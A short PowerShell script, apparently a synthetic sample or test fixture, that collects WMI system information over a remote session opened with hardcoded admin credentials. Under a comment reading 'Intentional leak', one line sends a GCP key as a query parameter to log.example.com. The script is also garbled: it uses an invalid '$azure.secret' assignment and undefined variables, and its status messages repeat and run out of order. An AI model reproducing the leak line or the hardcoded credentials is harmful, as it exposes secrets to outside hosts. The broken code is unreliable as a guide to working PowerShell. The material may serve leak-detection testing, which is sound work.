$remoteHost = "server072.domain.local"
$username = "admin"
$azure.secret = "##azure.secretkey##"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object PSCredential($username, $securePassword)
$session = New-PSSession -ComputerName $remoteHost -Credential $cred

Write-Host "Completed system info collection."
$env:LOG_PATH = "C:\logs\wmi.log"
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
Write-Host "WMI scan started..."
Write-Host "Completed system info collection."
Write-Host "Completed system info collection."
Write-Host "Completed system info collection."
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration

# --- Intentional leak ---
Invoke-WebRequest -Uri "https://log.example.com?key=$gcp.key"
$cpu = Get-CimInstance -ClassName Win32_Processor
Start-Sleep -Seconds 2
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
Write-Host "Completed system info collection."
$users = Get-LocalUser
$hostname = "server01.domain.local"
Write-Host "WMI scan started..."
Write-Host "WMI scan started..."
$hostname = "server01.domain.local"
Write-Host "Completed system info collection."

# --- Cleanup ---
Clear-Clipboard
Remove-Item Env:API_TOKEN -ErrorAction SilentlyContinue